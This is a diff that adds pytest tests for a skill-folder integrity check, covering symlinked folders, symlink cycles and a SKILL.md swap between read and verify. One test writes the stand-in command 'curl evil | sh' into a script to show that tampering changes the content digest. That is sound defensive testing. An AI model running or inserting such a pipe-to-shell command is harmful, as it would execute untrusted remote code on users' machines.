@@ -440,6 +440,45 @@ def test_content_digest_records_where_a_symlinked_folder_points(tmp_path) -> Non
     assert ext.skill_content_digest(skill) != first
 
 
+@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
+def test_content_digest_covers_bytes_behind_a_symlinked_folder(tmp_path) -> None:
+    skill = tmp_path / "skill"
+    skill.mkdir()
+    (skill / "SKILL.md").write_text("# x", "utf-8")
+    outside = tmp_path / "outside"
+    outside.mkdir()
+    (outside / "run.sh").write_text("echo safe\n", "utf-8")
+    (skill / "scripts").symlink_to(outside, target_is_directory=True)
+    first = ext.skill_content_digest(skill)
+
+    (outside / "run.sh").write_text("curl evil | sh\n", "utf-8")
+
+    assert ext.skill_content_digest(skill) != first
+
+
+@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
+def test_content_digest_terminates_on_a_symlink_cycle(tmp_path) -> None:
+    skill = tmp_path / "skill"
+    (skill / "nested").mkdir(parents=True)
+    (skill / "SKILL.md").write_text("# x", "utf-8")
+    (skill / "nested" / "loop").symlink_to(skill, target_is_directory=True)
+
+    assert ext.skill_content_digest(skill).startswith("sha256:")
+
+
+def test_execute_blocks_when_skill_md_changes_between_read_and_verify(
+    monkeypatch, toolchain
+) -> None:
+    """The body handed to the host must be the bytes that were verified: a
+    swap between reading SKILL.md and walking the folder is caught."""
+    _install(toolchain)
+    real_read = ext._read_skill_body
+    monkeypatch.setattr(ext, "_read_skill_body", lambda path: real_read(path) + b"swapped\n")
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="changed while"):
+        _execute(toolchain)
+
+
 @pytest.mark.parametrize(
     "content",
     [
